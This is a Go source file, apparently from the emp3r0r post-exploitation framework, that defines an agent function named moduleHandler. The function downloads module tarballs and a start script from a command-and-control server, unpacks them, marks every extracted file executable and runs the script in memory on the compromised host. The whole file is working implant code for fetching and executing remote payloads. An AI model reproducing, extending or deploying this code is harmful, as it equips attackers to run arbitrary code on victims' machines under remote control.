package agent

import (
	"fmt"
	"log"
	"os"
	"runtime"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver/v3"
)

// moduleHandler downloads and runs modules from C2
func moduleHandler(modName, checksum string) (out string) {
	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.xz"
	modDir := RuntimeConfig.AgentRoot + "/" + modName
	start_script := "start.sh"
	if runtime.GOOS == "windows" {
		start_script = "start.ps1"
	}

	// if we have already downloaded the module, dont bother downloading again
	if tun.SHA256SumFile(tarball) != checksum {
		_, err := DownloadViaCC(modName+".tar.xz",
			tarball)
		if err != nil {
			return err.Error()
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("checksum failed, restarting...")
		os.RemoveAll(tarball)
		moduleHandler(modName, checksum)
	}

	// extract files
	os.RemoveAll(modDir)
	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Sprintf("Unarchive module tarball: %v", err)
	}

	// download start.sh
	payload, err := DownloadViaCC(start_script, "")
	if err != nil {
		return fmt.Sprintf("Downloading %s: %v", start_script, err)
	}

	// exec
	pwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("pwd: %v", err)
	}
	err = os.Chdir(modDir)
	if err != nil {
		return fmt.Sprintf("cd to module dir: %v", err)
	}

	// process files in module archive
	files, err := os.ReadDir("./")
	if err != nil {
		return fmt.Sprintf("Processing module files: %v", err)
	}
	for _, f := range files {
		libs_tarball := "libs.tar.xz"
		os.Chmod(f.Name(), 0o700)
		if util.IsExist(libs_tarball) {
			os.RemoveAll("libs")
			err = archiver.Unarchive(libs_tarball, "./")
			if err != nil {
				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
			}
		}
	}

	// run wrapper script in memory
	out, err = RunModuleScript(payload)

	// debug
	log.Printf("Running %s:\n%s", start_script, payload)

	defer os.Chdir(pwd)

	return string(out)
}
